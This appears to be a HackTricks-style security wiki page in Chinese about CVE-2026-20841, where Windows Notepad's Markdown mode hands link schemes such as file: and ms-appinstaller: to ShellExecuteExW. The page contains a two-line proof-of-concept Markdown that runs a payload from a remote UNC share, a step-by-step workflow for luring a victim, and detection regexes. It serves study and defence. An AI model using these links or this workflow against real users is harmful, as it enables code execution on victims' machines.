# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

现代 Windows 应用在渲染 Markdown/HTML 时，通常会把用户提供的链接转换为可点击的元素并传递给 `ShellExecuteExW`。如果没有对 scheme 进行严格的白名单限制，任何已注册的 protocol handler（例如 `file:`、`ms-appinstaller:`）都可能被触发，导致在当前用户上下文中执行代码。

## ShellExecuteExW 在 Windows Notepad Markdown 模式下的攻击面
- Notepad 通过 `sub_1400ED5D0()` 中的固定字符串比较，**仅对 `.md` 扩展名** 选择 Markdown 模式。
- 支持的 Markdown 链接：
- Standard: `[text](target)`
- Autolink: `<target>`（呈现为 `[target](target)`），因此两种语法对 payload 和检测都很重要。
- 链接点击由 `sub_140170F60()` 处理，该函数执行弱过滤然后调用 `ShellExecuteExW`。
- `ShellExecuteExW` 会分发到 **任何已配置的 protocol handler**，而不仅仅是 HTTP(S)。

### Payload 注意事项
- 链接中的任何 `\\` 序列在传递给 `ShellExecuteExW` 前会被 **规范化为 `\`**，这会影响 UNC/路径 的构造和检测。
- `.md` 文件默认 **未与 Notepad 关联**；受害者仍需在 Notepad 中打开该文件并点击链接，但一旦渲染，链接就是可点击的。
- 危险的示例 scheme：
- `file://` 用于启动本地/UNC payload。
- `ms-appinstaller://` 用于触发 App Installer 流程。其他本地注册的 scheme 也可能被滥用。

### 最小 PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 利用流程
1. 制作一个 **`.md` 文件**，使 Notepad 将其呈现为 Markdown。
2. 嵌入使用危险的 URI scheme 的链接 (`file:`, `ms-appinstaller:`, 或任何已安装的 handler)。
3. 通过 (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 或类似方式) 传送该文件，并诱导用户在 Notepad 中打开它。
4. 在点击时，**规范化的链接** 会被传给 `ShellExecuteExW`，相应的协议处理程序在用户上下文中执行所引用的内容。

## 检测思路
- 监控通过常用于传输文档的端口/协议传输的 `.md` 文件： `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`。
- 解析 Markdown 链接（标准链接与自动链接），并查找 **不区分大小写** 的 `file:` 或 `ms-appinstaller:`。
- 厂商指导的正则表达式以捕获对远程资源的访问：
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- 补丁行为据报道 **allowlists local files and HTTP(S)**；任何其他到达 `ShellExecuteExW` 的内容都应视为可疑。根据需要将检测扩展到其他已安装的协议处理程序，因为攻击面因系统而异。

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
